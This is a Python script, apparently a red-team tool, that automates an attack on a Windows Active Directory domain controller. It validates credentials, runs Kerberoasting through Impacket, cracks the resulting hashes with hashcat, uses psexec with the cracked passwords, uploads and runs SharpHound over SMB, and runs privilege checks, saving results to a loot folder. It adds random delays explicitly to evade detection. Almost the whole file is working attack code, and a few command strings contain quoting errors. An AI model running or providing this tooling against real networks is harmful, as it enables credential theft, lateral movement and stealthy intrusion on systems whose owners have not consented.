# redhelper.py
# Auto Red Team Helper Script (Enhanced with Stealth, Summary Report, Delay, BloodHound, and Priv Esc Checks)

import os
import argparse
import getpass
import subprocess
import time
import random

# ----------------------
# SETUP CLI Arguments
# ----------------------
parser = argparse.ArgumentParser(
    description="Red Team Automation Script: Performs Kerberoasting + Crack + psexec if successful",
    epilog="Example: python3 redhelper.py --target 192.168.112.130 --domain lab.local --user SQLUser --password 'P@ssword123' --stealth 2"
)
parser.add_argument("--target", help="Target IP address (Domain Controller)")
parser.add_argument("--domain", help="Domain name (e.g., lab.local)")
parser.add_argument("--user", help="Username to authenticate (must have SPN set)")
parser.add_argument("--password", help="Password for the user")
parser.add_argument("--hash", help="NTLM hash for pass-the-hash (optional, overrides password)")
parser.add_argument("--stealth", type=int, choices=range(0, 4), default=1, help="Stealth level (0=Noisy, 1=Normal, 2=Quiet, 3=Very Stealthy)")
parser.add_argument("--bloodhound", action="store_true", help="Run BloodHound collection (auto-upload SharpHound)")
args = parser.parse_args()

# ----------------------
# HELPER
# ----------------------
def stealth_delay():
    if args.stealth > 0:
        delay = random.randint(2, 5 * args.stealth)
        print(f"[*] Sleeping {delay}s to avoid detection...")
        time.sleep(delay)

def run_cmd(cmd, capture_output=False):
    return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE if capture_output else None, stderr=subprocess.STDOUT)

# ----------------------
# INITIALIZE
# ----------------------
if not all([args.target, args.domain, args.user]) or (not args.password and not args.hash):
    print("[!] Missing one or more required arguments. Use --help to see usage.")
    exit(1)

# Assign variables
target = args.target
user = args.user
password = args.password
ntlm_hash = args.hash
domain = args.domain
stealth = args.stealth
loot_dir = f"loot_{target}"
os.makedirs(loot_dir, exist_ok=True)

print(f"[+] Starting recon and setup on {target} with Stealth Level: {stealth}\n")
stealth_delay()

# ----------------------
# 0. Credential Validation
# ----------------------
if password:
    print("[*] Validating credentials via SMB login...")
    cmd = f"smbclient -L //{target} -U {domain}/{user}%{password}"
    result = run_cmd(cmd, capture_output=True)
    if b"NT_STATUS_LOGON_FAILURE" in result.stdout:
        print("[!] Invalid credentials. Please check username and password.")
        exit(1)
    print("[+] Credential validation successful. Proceeding...\n")
else:
    print("[*] Using NTLM hash authentication (pass-the-hash mode). Skipping credential validation.\n")

# ----------------------
# 1. Nmap Scan
# ----------------------
if stealth <= 1:
    print("[*] Running Nmap scan...")
    stealth_delay()
    run_cmd(f"nmap -sC -sV -Pn -oN {loot_dir}/nmap.txt {target}")
else:
    print("[!] Skipping Nmap due to high stealth setting.")

# ----------------------
# 2. Check Impacket
# ----------------------
print("[*] Checking for Impacket...")
if not os.path.isdir("/opt/impacket"):
    print("[+] Cloning Impacket repo...")
    os.system("git clone https://github.com/fortra/impacket.git /opt/impacket")
    os.system("cd /opt/impacket && pip install .")
else:
    print("[+] Impacket already installed.")

# ----------------------
# 3. SMB Enum
# ----------------------
if stealth < 3:
    print("[*] Enumerating SMB shares...")
    stealth_delay()
    if password:
        run_cmd(f"smbclient -L //{target} -U {domain}/{user}%{password} > {loot_dir}/smb_enum.txt")
else:
    print("[!] Skipping SMB share enumeration due to stealth level.")

# ----------------------
# 4. Detect SPNs
# ----------------------
print("[*] Detecting users with SPNs via GetUserSPNs.py...")
stealth_delay()
spn_list_cmd = f"python3 /opt/impacket/examples/GetUserSPNs.py {domain}/{user}:{password} -dc-ip {target}" if password else f"python3 /opt/impacket/examples/GetUserSPNs.py {domain}/{user} -hashes :{ntlm_hash} -dc-ip {target}"
os.system(spn_list_cmd)

# ----------------------
# 5. Kerberoasting
# ----------------------
print("[*] Running GetUserSPNs.py for Kerberoasting...")
stealth_delay()
spn_cmd = f"python3 /opt/impacket/examples/GetUserSPNs.py {domain}/{user}:{password} -dc-ip {target} -outputfile {loot_dir}/roast.txt" if password else f"python3 /opt/impacket/examples/GetUserSPNs.py {domain}/{user} -hashes :{ntlm_hash} -dc-ip {target} -outputfile {loot_dir}/roast.txt"
os.system(spn_cmd)

# ----------------------
# 6. Hash Cracking
# ----------------------
print("[*] Attempting hash crack with hashcat (if roast.txt exists)...")
cracked_user = None
cracked_pass = None
stealth_delay()
if os.path.exists(f"{loot_dir}/roast.txt"):
    print("[+] Cracking hash using hashcat...")
    crack_cmd = f"hashcat -m 13100 {loot_dir}/roast.txt /usr/share/wordlists/rockyou.txt -o {loot_dir}/cracked.txt --force"
    os.system(crack_cmd)
    if os.path.exists(f"{loot_dir}/cracked.txt"):
        with open(f"{loot_dir}/cracked.txt", "r") as f:
            line = f.readline().strip()
            if line:
                parts = line.split(":")
                if len(parts) >= 2:
                    cracked_user = parts[0]
                    cracked_pass = parts[1]
                    print(f"[+] Found cracked credentials: {cracked_user}:{cracked_pass}")
else:
    print("[-] No roast.txt found, skipping crack step.")

# ----------------------
# 7. psexec with cracked creds
# ----------------------
if cracked_user and cracked_pass:
    print("[*] Attempting psexec with cracked credentials...")
    stealth_delay()
    os.system(f"python3 /opt/impacket/examples/psexec.py {domain}/{cracked_user}:{cracked_pass}@{target}")
else:
    print("[-] No valid credentials found for psexec step.")

# ----------------------
# 8. BloodHound Collection + SharpHound Upload
# ----------------------
if args.bloodhound:
    print("[*] Uploading and executing SharpHound.exe for BloodHound collection...")
    stealth_delay()
    sh_exe = "tools/SharpHound.exe"
    if os.path.exists(sh_exe):
        upload_cmd = f"smbclient //{target}/C$ -U {domain}/{user}%{password} -c \"put {sh_exe} Windows\\Temp\\{sh_exe}\""
        os.system(upload_cmd)
        exec_cmd = f"python3 /opt/impacket/examples/psexec.py {domain}/{user}:{password}@{target} \"cmd.exe /c C:\\Windows\\Temp\\{sh_exe} -c All -o C:\\Users\\Public\\loot.zip\""
        os.system(exec_cmd)
    else:
        print("[!] SharpHound.exe not found in current directory.")

# ----------------------
# 9. Basic Priv Esc Checks
# ----------------------
print("[*] Running basic privilege escalation checks...")
stealth_delay()
privesc_cmd = f"python3 /opt/impacket/examples/psexec.py {domain}/{user}:{password}@{target} \"cmd.exe /c whoami /priv & net localgroup administrators\" > {loot_dir}/privesc.txt\""
os.system(privesc_cmd)

# ----------------------
# 10. Write Summary
# ----------------------
summary_file = f"{loot_dir}/summary.txt"
with open(summary_file, "w") as summary:
    summary.write("Red Team Recon Summary\n")
    summary.write("=======================\n")
    summary.write(f"Target: {target}\n")
    summary.write(f"Domain: {domain}\n")
    summary.write(f"User: {user}\n")
    summary.write(f"Stealth Level: {stealth}\n\n")
    summary.write(f"Nmap: {loot_dir}/nmap.txt\n")
    summary.write(f"SMB Enum: {loot_dir}/smb_enum.txt\n")
    summary.write(f"Kerberoast Hash: {loot_dir}/roast.txt\n")
    summary.write(f"Cracked Passwords: {loot_dir}/cracked.txt\n")
    if cracked_user:
        summary.write(f"\n[+] Cracked User: {cracked_user}\nPassword: {cracked_pass}\n")

print(f"\n[+] Recon and attack phase complete. Results saved to: {summary_file}")
